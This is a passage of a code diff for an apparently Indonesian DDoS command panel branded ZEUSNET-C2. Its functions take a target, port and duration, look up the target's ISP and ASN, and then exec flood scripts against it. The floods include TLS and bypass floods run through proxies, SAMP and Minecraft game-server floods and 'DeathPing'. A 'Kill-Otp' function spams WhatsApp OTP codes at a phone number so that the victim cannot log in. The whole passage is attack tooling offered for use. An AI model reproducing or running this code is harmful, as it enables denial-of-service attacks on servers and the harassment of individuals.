+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-tls.js`);
+exec(`node ${metode} ${target} ${duration} 65 10`)
+sigma()
+};
+// [========================================] //
+async function zs_browser(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zs-Browser <Target> <Port>  <Duration>
+Zs-Browser https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+ const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zs-Browser \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zs-browser.js`);
+exec(`node ${metode} ${target} ${duration} 65 10`)
+sigma()
+};
+// [========================================] //
+async function zs_bypass(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zs-Bypass <Target> <Port>  <Duration>
+Zs-Bypass https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zs-Bypass \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zs-bypass.js`);
+exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
+sigma()
+};
+// [========================================] //
+async function zeus_flash(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Flash <Target> <Port>  <Duration>
+Zeus-Flash https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Flash \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-flash.js`);
+exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
+sigma()
+};
+// [========================================] //
+async function zeus_love(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Love <Target> <Port>  <Duration>
+Zeus-Love https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Love \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-love.js`);
+exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
+sigma()
+};
+// [========================================] //
+async function zeus_raw(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Raw <Target> <Port>  <Duration>
+Zeus-Raw https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Raw \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-raw.js`);
+exec(`node ${metode} ${target} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function zeus_sad(args) {
+  if (args.length < 3) {
+    console.log(`Example: Zeus-Sad <Target> <Port>  <Duration>
+Zeus-Sad https://contoh.com 443 60`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+const parsing = new url.URL(target)
+const hostname = parsing.hostname
+const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
+const result = scrape.data;
+console.clear()
+console.log(`
+                                                - Powered By ZEUSNET-C2 -
+
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀ \x1b[1;31m  \x1b[95m\x1b[47mAttack Details\x1b[0m
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Sad \x1b[1;31m]
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
+                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
+`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/zeus-sad.js`);
+exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
+sigma()
+};
+// [========================================] //
+async function killOTP(args) {
+  if (args.length < 2) {
+    console.log(`Example: Kill-Otp <Target> <Duration>
+Kill-Otp 628xxx 120`);
+    sigma();
+	return
+  }
+const [target, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}OTP Killer Has Been Launched${Reset}
+========================================================================
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+
+${bold}${cyan}Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+}
+
+const metode = path.join(__dirname, `/lib/cache/temp.js`);
+exec(`node ${metode} +${target} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function samp(args) {
+  if (args.length < 3) {
+    console.log(`Example: Samp <Target> <Port> <Duration>
+Samp 123.456.78.910 7777 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}SAMP Flood Attack Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : Samp Flood${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/samp.js`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function mc(args) {
+  if (args.length < 3) {
+    console.log(`Example: Mc <Target> <Port> <Duration>
+Mc 123.456.78.910 7777 300`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
+⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
+⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+${bold}${cyan}SAMP Flood Attack Launched${Reset}
+========================================================================
+${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
+${bold}${cyan}Target${Reset}   : ${target}
+${bold}${cyan}Duration${Reset} : ${duration}
+${bold}${cyan}Methods  : Mc Flood${Reset}
+${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
+} catch (error) {
+  console.log(`Oops Something Went Wrong`)
+    sigma()
+}
+const metode = path.join(__dirname, `/lib/cache/mc.js`);
+exec(`node ${metode} ${target} ${port} ${duration}`)
+sigma()
+};
+// [========================================] //
+async function DeathPing(args) {
+  if (args.length < 3) {
+    console.log(`Example: DeathPing <Target> <Duration>
+DeathPing 123.456.78.910 120`);
+    sigma();
+	return
+  }
+const [target, port, duration] = args
+try {
+console.clear()
+console.log(`
+⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
+⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
+⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
+⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
